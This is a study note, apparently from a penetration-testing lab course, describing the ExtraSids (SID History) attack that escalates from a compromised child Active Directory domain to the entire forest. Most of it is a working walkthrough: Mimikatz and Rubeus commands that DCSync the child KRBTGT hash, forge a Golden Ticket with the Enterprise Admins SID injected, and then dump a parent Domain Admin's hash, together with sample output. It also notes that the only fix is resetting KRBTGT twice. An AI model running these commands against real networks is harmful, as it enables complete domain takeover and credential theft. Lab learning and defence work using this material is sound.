

> ⚠️ This attack forges a Golden Ticket to compromise an entire forest from a single compromised child domain. Extremely high impact — treat with the same care as any DA-level persistence mechanism, and remember the only fix is resetting the KRBTGT password (twice).

---

## 1. SID History Primer

- **`sidHistory`** attribute exists to support domain migration: when a user moves to a new domain, their old SID is preserved in `sidHistory` so they retain access to resources in the original domain.
- Intended for cross-domain use, but functions within a single domain too.
- **Abuse:** Using Mimikatz, an attacker can inject an arbitrary SID (e.g., a Domain Admin's) into the `sidHistory` of a controlled account.
- On login, **all SIDs** in `sidHistory` are added to the user's access token — token is what's actually checked for resource access.
- If the injected SID belongs to a Domain Admin (or Enterprise Admins), the attacker's account is treated as a member of that group for access-control purposes → enables **DCSync** and **Golden Ticket** creation.

---

## 2. ExtraSids Attack — Concept

**Why it works:** Within the _same forest_, `sidHistory` is respected because **SID Filtering** (which normally strips foreign SIDs on cross-forest authentication) is **not applied intra-forest**.

**The idea:** This attack allows for the compromise of a parent domain once the child domain has been compromised. 

Forge a Golden Ticket in the _compromised child domain_, but inject the **Enterprise Admins** SID (which only exists in the parent/root domain) as an Extra SID. The KDC treats the ticket holder as an Enterprise Admin → full forest compromise, without ever needing valid parent-domain credentials.

### Requirements

|Item|Source|
|---|---|
|KRBTGT hash for the **child domain**|DCSync against `<CHILD>\krbtgt`|
|SID of the **child domain**|Mimikatz DCSync output or `Get-DomainSID`|
|Name of a target user in the child domain|**Does not need to exist**|
|FQDN of the child domain|Known from enumeration|
|SID of the **Enterprise Admins** group (root domain)|`Get-DomainGroup` or `Get-ADGroup`|

---

## 3. Gathering the Required Data

### Step 1 — Get the Child Domain's KRBTGT Hash (DCSync)


```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

```
Object Security ID   : S-1-5-21-2806153819-209893948-922872689
Hash NTLM: 9d765b482771505cbe97411065964d5f
```

> This also reveals the child domain's SID (the base of the account's Object Security ID).

### Step 2 — Get the Child Domain's SID (alternative)

powershell

```powershell
Get-DomainSID
```

```
S-1-5-21-2806153819-209893948-922872689
```

### Step 3 — Get the Enterprise Admins Group SID (root domain)

powershell

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

```
distinguishedname                                       objectsid
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

> Alternative: `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`

### Data Collected (Example)

|Field|Value|
|---|---|
|KRBTGT hash (child)|`9d765b482771505cbe97411065964d5f`|
|Child domain SID|`S-1-5-21-2806153819-209893948-922872689`|
|Target user (fake OK)|`hacker`|
|Child domain FQDN|`LOGISTICS.INLANEFREIGHT.LOCAL`|
|Enterprise Admins SID|`S-1-5-21-3842939050-3880317879-2865463114-519`|

### Step 4 — Confirm No Access to Parent DC (Before Attack)

powershell

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

```
Access is denied
```

---

## 4. Forging the Golden Ticket

### Option A — Mimikatz

powershell

```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

- `/sid` = child domain SID
- `/sids` = Extra SID(s) to inject — here, Enterprise Admins
- `/ptt` = pass-the-ticket (inject directly into current session)

```
Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

Confirm the ticket is loaded:

```powershell
klist
```

### Option B — Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

- `/rc4` = KRBTGT NT hash
- Automatically imports the ticket (`/ptt`) — verify with `klist`

---

## 5. Confirming Forest Compromise

### Access Parent DC Filesystem

powershell

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Now returns full directory listing — access confirmed.

### DCSync Against the Parent Domain

powershell

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

Returns the Domain Admin's NTLM hash — full parent domain compromise achieved.

> **Multi-domain tip:** If the target domain differs from the ticket's origin domain, specify it explicitly:
> 
> powershell
> 
> ```powershell
> lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
> ```

---

## Summary

|Step|Action|Tool|
|---|---|---|
|1|Compromise child domain, DCSync KRBTGT|Mimikatz|
|2|Gather child domain SID + Enterprise Admins SID|Mimikatz output, PowerView / Get-ADGroup|
|3|Forge Golden Ticket w/ Enterprise Admins as Extra SID|Mimikatz `kerberos::golden` or Rubeus `golden`|
|4|Access parent domain resources / DCSync parent DA|Any tool (now fully privileged)|

## Key Takeaways

- Works because **SID Filtering doesn't apply within the same forest** — this is a forest boundary problem, not just a domain one.
- Target user for the Golden Ticket **does not need to exist**.
- **Only remediation:** reset the KRBTGT password (twice, due to password history) in the affected domain — this invalidates all existing Golden Tickets tied to that KRBTGT hash.
- This is a critical finding — child domain compromise = forest compromise if SID filtering isn't reinforced.

## Up Next

- Performing the same child → parent (ExtraSids) attack from a **Linux** attack host